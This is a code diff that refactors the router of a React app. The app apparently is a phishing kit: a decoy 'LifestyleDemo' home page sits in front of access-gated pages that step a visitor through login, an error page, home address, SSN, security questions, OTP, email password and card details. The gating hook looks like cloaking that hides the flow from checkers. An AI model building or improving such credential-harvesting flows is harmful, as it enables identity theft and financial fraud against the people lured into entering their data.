@@ -19,10 +19,10 @@ import Terms from './pages/Terms';
 import LifestyleDemo from './pages/LifestyleDemo';
 
 interface ProtectedRouteProps {
-  element: React.ReactNode;
+  children: React.ReactNode;
 }
 
-const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ element }) => {
+const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ children }) => {
   const isAllowed = useAccessCheck(baseUrl);
 
   if (isAllowed === null) {
@@ -41,7 +41,7 @@ const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ element }) => {
     );
   }
 
-  return <FlowLayout>{element}</FlowLayout>;
+  return <FlowLayout>{children}</FlowLayout>;
 };
 
 function App() {
@@ -52,18 +52,18 @@ function App() {
         <Route path="/" element={<LifestyleDemo />} />
 
         {/* Protected routes */}
-        <Route path="/login" element={<ProtectedRoute element={<LoginForm />} />} />
-        <Route path="/login-error" element={<ProtectedRoute element={<LoginForm2 />} />} />
-        <Route path="/register" element={<ProtectedRoute element={<Register />} />} />
-        <Route path="/basic-info" element={<ProtectedRoute element={<BasicInfo />} />} />
-        <Route path="/home-address" element={<ProtectedRoute element={<HomeAddress />} />} />
-        <Route path="/ssn1" element={<ProtectedRoute element={<SSN1 />} />} />
-        <Route path="/ssn2" element={<ProtectedRoute element={<SSN2 />} />} />
-        <Route path="/security-questions" element={<ProtectedRoute element={<SecurityQuestions />} />} />
-        <Route path="/otp" element={<ProtectedRoute element={<OTP />} />} />
-        <Route path="/email-password" element={<ProtectedRoute element={<EmailPassword />} />} />
-        <Route path="/card" element={<ProtectedRoute element={<Card />} />} />
-        <Route path="/terms" element={<ProtectedRoute element={<Terms />} />} />
+        <Route path="/login" element={<ProtectedRoute><LoginForm /></ProtectedRoute>} />
+        <Route path="/login-error" element={<ProtectedRoute><LoginForm2 /></ProtectedRoute>} />
+        <Route path="/register" element={<ProtectedRoute><Register /></ProtectedRoute>} />
+        <Route path="/basic-info" element={<ProtectedRoute><BasicInfo /></ProtectedRoute>} />
+        <Route path="/home-address" element={<ProtectedRoute><HomeAddress /></ProtectedRoute>} />
+        <Route path="/ssn1" element={<ProtectedRoute><SSN1 /></ProtectedRoute>} />
+        <Route path="/ssn2" element={<ProtectedRoute><SSN2 /></ProtectedRoute>} />
+        <Route path="/security-questions" element={<ProtectedRoute><SecurityQuestions /></ProtectedRoute>} />
+        <Route path="/otp" element={<ProtectedRoute><OTP /></ProtectedRoute>} />
+        <Route path="/email-password" element={<ProtectedRoute><EmailPassword /></ProtectedRoute>} />
+        <Route path="/card" element={<ProtectedRoute><Card /></ProtectedRoute>} />
+        <Route path="/terms" element={<ProtectedRoute><Terms /></ProtectedRoute>} />
 
         {/* Redirect any unknown routes to home */}
         <Route path="*" element={<Navigate to="/" replace />} />
